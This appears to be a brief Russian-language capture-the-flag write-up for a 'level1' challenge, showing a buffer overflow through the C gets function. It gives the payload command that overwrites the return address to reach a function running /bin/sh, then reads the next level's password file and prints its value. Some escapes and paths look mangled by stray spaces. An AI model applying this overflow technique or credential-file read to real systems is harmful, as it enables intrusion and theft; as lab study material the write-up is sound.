# Функция C `gets`

# Готовим payload для эксплойта
```
1. $> python -c 'print "a" * 76 + "\ x44 \ x84 \ x04 \ x08"'> / tmp / payload
```
\ x44 \ x84 \ x04 \ x08 соответствуют младшему порядку байтов адреса 08048444

#     Адрес соответствует началу функции `run`
#     В функции `run` мы видим `system (" / bin / sh ")`
```
2. $> cat / tmp / payload - | ./level1
3. > cat /home/user/level2/.pass
```
>53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

# ╮(￣_￣)╭
